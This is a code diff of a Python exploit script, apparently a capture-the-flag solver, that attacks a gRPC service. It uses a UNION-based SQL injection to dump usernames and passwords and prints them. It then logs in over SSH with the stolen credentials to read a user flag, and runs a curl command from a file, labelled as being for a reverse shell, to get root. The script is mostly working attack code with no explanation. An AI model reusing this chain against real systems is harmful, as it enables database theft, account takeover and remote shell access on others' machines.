@@ -3,6 +3,7 @@ import SimpleApp_pb2_grpc as pb2_grpc
 import SimpleApp_pb2 as pb2
 import paramiko
 import multiprocessing
+import json
 
 from revsh import Revsh
 
@@ -16,7 +17,7 @@ def main():
     token = get_token(stub)
     users = get_users(stub, token)
 
-    # user_flag = get_user_flag()
+    get_user_flag(users)
     get_root_flag(users)
 
 
@@ -30,6 +31,8 @@ def get_token(stub):
 
 
 def get_users(stub, token):
+    print("Getting users")
+
     query = "62 UNION SELECT name FROM sqlite_master where type='table'"
     table = make_get_id_req(token, query, stub)
 
@@ -49,25 +52,19 @@ def get_users(stub, token):
     for i in range(len(usernames)):
         users.append({"username": usernames[i], "password": passwords[i]})
 
+    print("Users found")
+    print(json.dumps(users))
+    
     return users
 
 
-def get_user_flag():
-    return ssh_exec_command("cat user.txt")
+def get_user_flag(users):
+    print (f"User flag: {ssh_exec_command('cat user.txt', users)}")
 
 
 def get_root_flag(users):
     transfer_file_from_local(users)
     exec_curl_command(users)
-
-    # ssh_proc = multiprocessing.Process(target=ssh_exec_command, args=(curl_cmd, users))
-    # ssh_proc.start()
-    # ssh_proc.join()
-
-    # revsh = Revsh()
-    # revsh_proc = multiprocessing.Process(target=revsh.send_command())
-    # revsh_proc.join(timeout=10)
-
 
 def make_get_id_req(token, query, stub):
     metadata = (("token", token),)
@@ -116,6 +113,8 @@ def transfer_file_from_local(users):
 
 
 def exec_curl_command(users):
+    print("Executing curl for reverse shell")
+
     with open("../curl.txt") as f:
         command = f.read().strip()
     ssh_exec_command(command, users)
